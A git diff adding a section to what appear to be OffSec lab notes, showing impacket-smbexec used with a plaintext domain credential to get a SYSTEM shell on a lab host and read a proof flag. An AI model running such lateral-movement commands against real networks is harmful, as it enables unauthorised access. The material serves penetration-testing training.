@@ -155,6 +155,28 @@ corp\jen
 ```
 {% endcode %}
 
+## Impacket-smbexec
+
+PsExec from above worked as well, but when trying to "cd to Administrator" you get Access is denied.
+
+With impacket-smbexec it works to show the file.
+
+```
+kali㉿kali)-[~/offsec]
+└─$ /usr/bin/impacket-smbexec corp.com/leon:HomeTaping199\!@192.168.184.73
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+[!] Launching semi-interactive shell - Careful what you execute
+C:\Windows\system32>whoami
+nt authority\system
+
+C:\Windows\system32>hostname
+FILES04
+C:\Windows\system32>type C:\Users\Administrator\Desktop\proof.txt
+OS{def954eb67cb984ccb0f4d79b22ea387}
+
+```
+
 ## Pass the hash
 
 PTH only works for NTLM authentication, not for Kerberos authentication.
